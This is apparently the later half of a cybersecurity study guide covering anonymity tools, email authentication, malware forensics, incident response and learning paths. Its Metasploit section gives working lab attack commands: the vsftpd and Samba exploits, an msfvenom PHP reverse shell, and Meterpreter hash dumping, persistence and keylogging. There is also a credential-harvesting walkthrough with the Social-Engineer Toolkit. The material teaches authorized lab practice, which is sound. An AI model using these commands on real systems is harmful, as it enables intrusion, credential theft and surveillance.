Building a training program for your organization/test users:

```
MODULE 1: Phishing Awareness
- Identify phishing red flags
- Hover-before-click habit
- Reporting suspicious emails
- Simulated phishing (GoPhish campaigns)

MODULE 2: Password Security
- Password manager usage
- MFA setup
- Not reusing passwords
- Social engineering through password recovery

MODULE 3: Physical Security
- Clean desk policy
- Screen locking (Windows+L habit)
- USB drive policies
- Visitor procedures

MODULE 4: Incident Reporting
- What to report and to whom
- How to report suspicious activity
- No blame culture (encourages reporting)
```

### 10.3 Social Engineering Toolkit (SET) — Awareness Lab

```bash
# SET is on Kali — for security awareness testing with permission only:
sudo setoolkit

# Options:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method

# Exercise: Clone your own login page, capture credentials
# Then use as training example showing employees
```

---

## 11. Identity & Anonymity — VPN, Proxy, Tor, VPS

### 11.1 How Your IP Address Works

```
Your Device → Router (NAT) → ISP → Internet

What websites see: Your router's public IP (assigned by ISP)
What ISP sees: Your device MAC address, DNS queries, all traffic

IP reveals:
- Geographic location (city-level accuracy)
- ISP name
- Approximate timezone
- Organization (if business IP)
```

**Check your current public IP:**

```bash
curl https://ipinfo.io/json
curl https://ifconfig.me
```

### 11.2 VPN — How It Works

```
Without VPN:
Your Device → ISP → Website
(ISP sees all traffic, website sees real IP)

With VPN:
Your Device → Encrypted Tunnel → VPN Server → Website
(ISP sees encrypted blob, website sees VPN IP)

VPN protects: IP from websites, traffic from ISP/local network
VPN does NOT protect: From VPN provider themselves, from malware on device
```

**Setting up WireGuard VPN (self-hosted — you own the server):**

```bash
# On your VPS (server side):
sudo apt install wireguard
wg genkey | tee privatekey | wg pubkey > publickey
cat /etc/wireguard/wg0.conf << EOF
[Interface]
PrivateKey = $(cat privatekey)
Address = 10.0.0.1/24
ListenPort = 51820

[Peer]
PublicKey = <client-public-key>
AllowedIPs = 10.0.0.2/32
EOF
sudo wg-quick up wg0
```

### 11.3 Tor Network — How It Actually Works

```
Onion Routing:
Your Device → [Guard Node] → [Middle Node] → [Exit Node] → Website

Each node only knows:
- Guard: Your real IP + Middle node IP
- Middle: Guard IP + Exit IP
- Exit: Middle IP + destination
- Website: Exit node IP only

Your real IP is hidden from the destination.
Traffic is encrypted in three layers (like an onion).
```

```bash
# Install Tor Browser:
sudo apt install tor torbrowser-launcher
torbrowser-launcher

# Command-line Tor:
sudo apt install tor
sudo systemctl start tor
# Route traffic through SOCKS proxy at 127.0.0.1:9050

# Check Tor IP:
curl --socks5-hostname 127.0.0.1:9050 https://ipinfo.io/json
```

### 11.4 Proxy Types Comparison

| Type             | Anonymity           | Speed  | Trust Required          |
| ---------------- | ------------------- | ------ | ----------------------- |
| **HTTP Proxy**   | Low (not encrypted) | Fast   | High (they see traffic) |
| **SOCKS5 Proxy** | Medium              | Fast   | High                    |
| **VPN**          | Medium-High         | Medium | VPN provider            |
| **Tor**          | High                | Slow   | None (distributed)      |
| **VPN + Tor**    | Very High           | Slow   | VPN provider for timing |

### 11.5 Network Forensics — Tracing Connections

```bash
# Trace route to destination:
traceroute google.com      # Linux
tracert google.com         # Windows

# DNS lookup:
dig google.com
nslookup google.com

# Reverse DNS lookup:
dig -x 8.8.8.8

# WHOIS an IP (find ownership):
whois 185.220.101.45

# Check if IP is on abuse lists:
# https://www.abuseipdb.com/
# https://www.stopforumspam.com/
```

---

## 12. Email Security — SMTP, SPF, DKIM, Phishing Defense

### 12.1 How Email Delivery Works

```
SENDING:
Your App → SMTP Server → DNS MX Lookup → Recipient's SMTP → Inbox

Headers added at each hop:
Received: from smtp.yourdomain.com by mx.recipient.com
Received: from your-app by smtp.yourdomain.com
```

### 12.2 Email Authentication — SPF, DKIM, DMARC

**SPF (Sender Policy Framework):**

```
DNS TXT record tells receivers which servers can send email for your domain.

Example SPF record:
v=spf1 ip4:203.0.113.1 include:_spf.google.com -all

-all = reject if not listed
~all = mark as suspicious (soft fail)
```

**DKIM (DomainKeys Identified Mail):**

```
Email is cryptographically signed by the sending server.
Receiver checks the signature against your public key in DNS.

Header added:
DKIM-Signature: v=1; a=rsa-sha256; d=yourdomain.com; ...

DNS TXT record:
mail._domainkey.yourdomain.com → your-public-key
```

**DMARC (Domain-based Message Authentication):**

```
Tells receivers what to do when SPF/DKIM fail.

DNS TXT record:
_dmarc.yourdomain.com → v=DMARC1; p=reject; rua=mailto:reports@yourdomain.com

p=none    → Monitor only (no action)
p=quarantine → Spam folder
p=reject   → Reject the email
```

### 12.3 Setting Up Email Security for Your Domain

```bash
# Test current email security:
# https://mxtoolbox.com/SuperTool.aspx

# Check SPF:
dig TXT yourdomain.com | grep spf

# Check DKIM:
dig TXT mail._domainkey.yourdomain.com

# Check DMARC:
dig TXT _dmarc.yourdomain.com

# Send test email and check score:
# https://www.mail-tester.com/
```

### 12.4 Sending Bulk Email Legitimately (For Your Own Apps)

```python
# Using Python with proper authentication:
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_email(smtp_config, recipient, subject, body):
    msg = MIMEMultipart('alternative')
    msg['Subject'] = subject
    msg['From'] = smtp_config['from_address']
    msg['To'] = recipient

    # Plain text and HTML parts
    text_part = MIMEText(body['text'], 'plain')
    html_part = MIMEText(body['html'], 'html')
    msg.attach(text_part)
    msg.attach(html_part)

    with smtplib.SMTP_SSL(smtp_config['host'], smtp_config['port']) as server:
        server.login(smtp_config['username'], smtp_config['password'])
        server.sendmail(smtp_config['from_address'], recipient, msg.as_string())

# Use with your own SMTP (Gmail, SendGrid, Mailgun, etc.)
```

---

## 13. Malware Forensics — Detecting & Removing Infections

### 13.1 Live System Investigation

When you suspect a system is infected, follow this order:

```
VOLATILE (lost on reboot — capture FIRST):
1. Running processes
2. Network connections
3. Open files
4. Memory dump

NON-VOLATILE (persists after reboot — capture AFTER):
5. File system changes
6. Registry (Windows)
7. Logs
8. Startup items
```

### 13.2 Windows Forensic Commands

```powershell
# Running processes with full paths:
Get-Process | Select-Object Name, Id, Path | Sort-Object Name

# Network connections with process:
netstat -b -n -o

# Who is running what:
Get-NetTCPConnection | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess | Where-Object {$_.State -eq "Established"}

# Startup items:
Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location

# Scheduled tasks:
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object TaskName, TaskPath

# Recently modified files:
Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue |
  Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)} |
  Sort-Object LastWriteTime -Descending
```

### 13.3 Linux Forensic Commands

```bash
# Running processes (full info):
ps auxf

# Network connections:
ss -tunap
lsof -i

# Files opened by a suspicious process:
lsof -p <PID>

# Recently modified files:
find / -mmin -60 -type f 2>/dev/null | grep -v /proc | grep -v /sys

# Check crontabs:
for user in $(cut -f1 -d: /etc/passwd); do
  crontab -u $user -l 2>/dev/null
done

# Suspicious SUID files:
find / -perm -4000 -type f 2>/dev/null

# Check /tmp and /dev/shm (common malware locations):
ls -la /tmp/ /dev/shm/ /var/tmp/

# Loaded kernel modules:
lsmod

# Check for rootkits:
sudo apt install chkrootkit rkhunter
sudo chkrootkit
sudo rkhunter --check
```

### 13.4 Memory Forensics with Volatility

```bash
# Install Volatility3:
pip3 install volatility3

# Capture memory dump (Windows — from Kali/external):
# Use winpmem or DumpIt on the Windows VM

# Analyze dump:
vol -f memory.dmp windows.pslist      # Process list
vol -f memory.dmp windows.pstree     # Process tree
vol -f memory.dmp windows.netstat    # Network connections
vol -f memory.dmp windows.cmdline    # Command line arguments
vol -f memory.dmp windows.malfind    # Find injected code
vol -f memory.dmp windows.filescan   # Files in memory
vol -f memory.dmp windows.dumpfiles --pid 1234  # Dump specific process
```

### 13.5 Autoruns — Finding Persistence

```
Sysinternals Autoruns (Windows — free):
Download: https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

What it shows:
- Everything that runs at boot/login
- Verified signatures (trusted = green, suspicious = yellow/red)
- Unknown publishers = investigate first

Look for:
- Items in %TEMP%, %APPDATA%, Downloads
- Items with no publisher or invalid signature
- PowerShell/cmd scripts in startup
- Random-looking executable names
```

### 13.6 Malware Removal Procedure

```
1. ISOLATE — Remove from network (unplug or disable adapter)
2. DOCUMENT — Screenshot all findings before changing anything
3. IDENTIFY — Find all persistence mechanisms (autoruns, crons, registry)
4. REMOVE persistence entries first (so it doesn't reinstall)
5. KILL the malware process
6. DELETE malware files
7. VERIFY — Reboot and confirm it's gone
8. AUDIT — Check what data may have been accessed/exfiltrated
9. RESTORE or REIMAGE if not fully confident
10. ROOT CAUSE — How did it get in? Fix the vulnerability.
```

---

## 14. Exploitation Basics — Metasploit on Lab Machines

### 14.1 Metasploit Framework Structure

```
msfconsole
├── Exploits         → Code that exploits vulnerabilities
├── Payloads         → What runs after exploit succeeds
│   ├── Singles      → Self-contained (no staging)
│   ├── Stagers      → Small, downloads main payload
│   └── Stages       → Main payload (Meterpreter)
├── Auxiliaries      → Scanners, fuzzers, tools
├── Post             → Post-exploitation modules
└── Encoders         → Payload encoding
```

### 14.2 Metasploit Against Metasploitable2 (Full Lab Exercise)

```bash
# Metasploitable2 IP: 192.168.56.102
# Kali IP: 192.168.56.101

# 1. Scan the target:
nmap -sV -sC 192.168.56.102 -oN metasploitable_scan.txt

# Common open services on Metasploitable2:
# 21 - FTP (vsftpd 2.3.4 — backdoor!)
# 22 - SSH
# 23 - Telnet
# 80 - HTTP (DVWA)
# 3306 - MySQL
# 5432 - PostgreSQL

# 2. Start Metasploit:
msfconsole

# 3. Exploit vsftpd backdoor (famous vulnerability):
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run
# You get a shell!

# 4. Try Samba vulnerability:
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.102
set LHOST 192.168.56.101
run

# 5. After getting shell — upgrade to Meterpreter:
# Inside the shell:
background        # Background current session
use post/multi/manage/shell_to_meterpreter
set SESSION 1
run
```

### 14.3 Post-Exploitation on Your Own Lab

```bash
# After Meterpreter session on your Metasploitable2:
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid

# Privilege escalation:
meterpreter > getsystem

# Gather system info:
meterpreter > run post/linux/gather/enum_system
meterpreter > run post/linux/gather/enum_configs

# Network reconnaissance from compromised host:
meterpreter > run post/multi/gather/ping_sweep RHOSTS=10.0.0.0/24

# Dump password hashes (Linux):
meterpreter > run post/linux/gather/hashdump

# Persistence (on your own lab machine only):
meterpreter > run post/linux/manage/cron_persistence

# Screenshot:
meterpreter > screenshot

# Keylogger:
meterpreter > keyscan_start
# ... wait ...
meterpreter > keyscan_dump
meterpreter > keyscan_stop
```

### 14.4 Web Exploitation with Metasploit

```bash
# DVWA must be running at 192.168.56.102

# Test PHP command injection (DVWA low security):
# Navigate to: http://192.168.56.102/dvwa/vulnerabilities/exec/

# Exploit with Metasploit webshell:
use exploit/unix/webapp/php_include
# Or use Meterpreter PHP payload manually

# Generate PHP reverse shell:
msfvenom -p php/meterpreter_reverse_tcp \
  LHOST=192.168.56.101 LPORT=4444 \
  -f raw > shell.php

# Upload to DVWA via file upload vulnerability
# Set up handler:
use exploit/multi/handler
set payload php/meterpreter_reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
run

# Visit the uploaded shell URL
# Session opens!
```

---

## 15. Incident Response Framework

### 15.1 NIST Incident Response Lifecycle

```
┌─────────────┐
│ PREPARATION │ ← Policies, tools, training, playbooks
└──────┬──────┘
       ↓
┌─────────────────────┐
│ DETECTION &         │ ← IDS alerts, user reports, anomaly detection
│ ANALYSIS            │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│ CONTAINMENT,        │ ← Isolate, preserve evidence, eradicate
│ ERADICATION &       │
│ RECOVERY            │
└──────────┬──────────┘
           ↓
┌─────────────────────┐
│ POST-INCIDENT       │ ← Lessons learned, improve defenses
│ ACTIVITY            │
└─────────────────────┘
```

### 15.2 Incident Response Checklist

```
DETECTION PHASE:
□ Alert received / anomaly detected
□ Determine if it's a real incident or false positive
□ Assign severity level (Critical/High/Medium/Low)
□ Notify incident response team

CONTAINMENT PHASE:
□ Isolate affected systems from network
□ Preserve volatile evidence (memory, connections)
□ Take disk image if needed
□ Block attacker IPs/domains at firewall

ERADICATION PHASE:
□ Identify all malware components
□ Remove all persistence mechanisms
□ Patch the exploited vulnerability
□ Reset compromised credentials

RECOVERY PHASE:
□ Restore from clean backup (or reimage)
□ Verify system is clean
□ Monitor for re-infection
□ Gradually restore to production

POST-INCIDENT:
□ Document timeline of events
□ Root cause analysis
□ Update security controls
□ Share IOCs (Indicators of Compromise)
□ Update incident response plan
```

### 15.3 Log Analysis

```bash
# Linux — important log files:
/var/log/auth.log        # Authentication attempts
/var/log/syslog          # System messages
/var/log/apache2/access.log  # Web server requests
/var/log/apache2/error.log   # Web server errors
/var/log/fail2ban.log    # Blocked IPs

# Find failed SSH logins:
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn

# Find successful logins after failures (possible brute force success):
grep "Accepted password" /var/log/auth.log

# Apache — find suspicious requests:
grep "404" /var/log/apache2/access.log | awk '{print $7}' | sort | uniq -c | sort -rn
grep "sqlmap\|nikto\|nmap" /var/log/apache2/access.log  # Scanner detection

# Windows Event Logs (PowerShell):
Get-EventLog -LogName Security -EntryType FailureAudit -Newest 50
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625} # Failed logons
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} # Successful logons
```

---

## 16. Recommended Learning Path & Resources

### 16.1 Structured Learning Path

```
MONTH 1-2: Foundations
├── CompTIA Security+ study material
├── Networking basics (TCP/IP, DNS, HTTP)
├── Linux command line fluency
└── Set up your lab (VirtualBox + Kali + Metasploitable2)

MONTH 3-4: Web Security
├── OWASP Top 10 (in depth)
├── DVWA — complete all levels
├── PortSwigger Web Security Academy (free!)
├── Burp Suite Professional usage
└── Test your own web applications

MONTH 5-6: Network Security
├── Wireshark packet analysis
├── Nmap mastery
├── Metasploit basics
├── Metasploitable2 — compromise all services
└── HackTheBox / TryHackMe — easy machines

MONTH 7-8: Specialization
├── Choose: Web App / Network / Malware / Cloud
├── CTF competitions (picoCTF, CTFtime.org)
├── Bug bounty (HackerOne, Bugcrowd — real targets)
└── Build home lab projects

MONTH 9-12: Advanced
├── Exploit development basics
├── Reverse engineering (Ghidra, IDA Free)
├── Cloud security (AWS/Azure security)
├── Contribute to open source security tools
└── Prepare for certifications
```

### 16.2 Essential Certifications (Roadmap)

```
BEGINNER:
CompTIA Security+   → Industry baseline, widely recognized
CompTIA Network+    → If networking is weak

INTERMEDIATE:
eJPT (eLearnSecurity) → Practical, affordable, good starting point
CEH (EC-Council)      → Common in Bangladesh/Asia job market

ADVANCED:
OSCP (Offensive Security) → Gold standard for penetration testers
PNPT (TCM Security)       → Practical, affordable OSCP alternative
GPEN / GWAPT (GIAC)       → Respected, expensive

DEFENSIVE:
Blue Team Level 1 (BTL1)   → SOC analyst skills
CySA+ (CompTIA)            → Security analyst
```

### 16.3 Free Learning Resources

| Resource               | What It Covers                        | URL                             |
| ---------------------- | ------------------------------------- | ------------------------------- |
| TryHackMe              | Beginner-friendly guided labs         | tryhackme.com                   |
| HackTheBox             | CTF-style machines                    | hackthebox.com                  |
| PortSwigger Academy    | Web app security (best free resource) | portswigger.net/web-security    |
| TCM Security (YouTube) | Full ethical hacking courses          | youtube.com/@TCMSecurityAcademy |
| IppSec (YouTube)       | HackTheBox walkthroughs               | youtube.com/@ippsec             |
| OWASP                  | Web security standards/guides         | owasp.org                       |
| Cybrary                | Video courses                         | cybrary.it                      |
| VulnHub                | Offline VM challenges                 | vulnhub.com                     |

### 16.4 Books

```
Beginner:
- "The Web Application Hacker's Handbook" — Stuttard & Pinto
- "Hacking: The Art of Exploitation" — Jon Erickson
- "CompTIA Security+ Study Guide" — Mike Chapple

Intermediate:
- "The Hacker Playbook 3" — Peter Kim
- "Penetration Testing" — Georgia Weidman
- "Real-World Bug Hunting" — Peter Yaworski

Advanced:
- "The Shellcoder's Handbook" — multiple authors
- "Malware Analyst's Cookbook" — multiple authors
- "The Art of Memory Forensics" — Ligh et al.
```

### 16.5 Your Personal Lab Project Ideas

As a software engineer, you can build impressive security projects:

```
PROJECT 1: Vulnerable Web App (custom)
- Build a PHP/Node.js app with intentional vulnerabilities
- SQLi, XSS, IDOR, auth bypass
- Then document findings as a penetration test report
- Great for portfolio

PROJECT 2: Security Monitoring Dashboard
- Deploy Wazuh or ELK Stack in your lab
- Collect logs from all VMs
- Build alerting rules
- Create a SIEM dashboard

PROJECT 3: Honeypot
- Deploy Cowrie SSH honeypot
- Log all attacker commands
- Analyze attacker behavior
- Deploy on a VPS (with care)

PROJECT 4: Phishing Awareness Platform
- GoPhish + your own email templates
- Track click rates, credential submission
- Automated training redirect
- Dashboard for results

PROJECT 5: CTF Challenge Creation
- Build a web app with hidden flags
- Document the intended attack paths
- Host it for friends/colleagues
- Submit to CTFtime.org
```

---

## Appendix A — Kali Linux Essential Tools Reference

| Tool          | Category     | Usage                         |
| ------------- | ------------ | ----------------------------- |
| `nmap`        | Scanning     | Network/port scanning         |
| `metasploit`  | Exploitation | Framework for exploits        |
| `burpsuite`   | Web          | HTTP proxy/interceptor        |
| `sqlmap`      | Web          | SQL injection automation      |
| `hydra`       | Password     | Brute force login             |
| `john`        | Password     | John the Ripper hash cracking |
| `hashcat`     | Password     | GPU-accelerated hash cracking |
| `wireshark`   | Network      | Packet capture/analysis       |
| `aircrack-ng` | WiFi         | WiFi security testing         |
| `nikto`       | Web          | Web server scanner            |
| `gobuster`    | Web          | Directory/file enumeration    |
| `wfuzz`       | Web          | Web fuzzer                    |
| `volatility`  | Forensics    | Memory forensics              |
| `autopsy`     | Forensics    | Disk forensics GUI            |
| `setoolkit`   | Social Eng.  | Social engineering toolkit    |
| `msfvenom`    | Payloads     | Payload generator             |

## Appendix B — Common Ports Reference

| Port | Service    | Security Notes              |
| ---- | ---------- | --------------------------- |
| 21   | FTP        | Cleartext — avoid, use SFTP |
| 22   | SSH        | Secure, but brute-forceable |
| 23   | Telnet     | Cleartext — never use       |
| 25   | SMTP       | Email sending               |
| 53   | DNS        | DNS poisoning attacks       |
| 80   | HTTP       | Cleartext web traffic       |
| 443  | HTTPS      | Encrypted web traffic       |
| 3306 | MySQL      | Never expose to internet    |
| 3389 | RDP        | Common attack target        |
| 4444 | Metasploit | Default C2 port (red flag)  |
| 8080 | HTTP Alt   | Often dev/proxy servers     |

## Appendix C — Useful One-Liners

```bash
# Find SUID binaries (Linux priv esc):
find / -perm -u=s -type f 2>/dev/null

# Find world-writable files:
find / -perm -o+w -type f 2>/dev/null | grep -v proc

# Extract all IPs from a log file:
grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' logfile.txt | sort -u

# Check if a port is open:
nc -zv target.com 80

# Generate random password:
openssl rand -base64 32

# Hash a password (bcrypt):
python3 -c "import bcrypt; print(bcrypt.hashpw(b'password', bcrypt.gensalt()))"

# Decode base64:
echo "SGVsbG8gV29ybGQ=" | base64 -d

# Find files modified in last 24 hours:
find / -mtime -1 -type f 2>/dev/null

# Download a file:
wget http://target/file -O output
curl http://target/file -o output
```

---

_This guide covers concepts from virtualization and malware theory through web exploitation, network security, and incident response — all structured for legal, ethical practice on your own systems and dedicated lab environments. Always obtain written permission before testing any system you do not personally own._

**Good luck with your cybersecurity studies!**
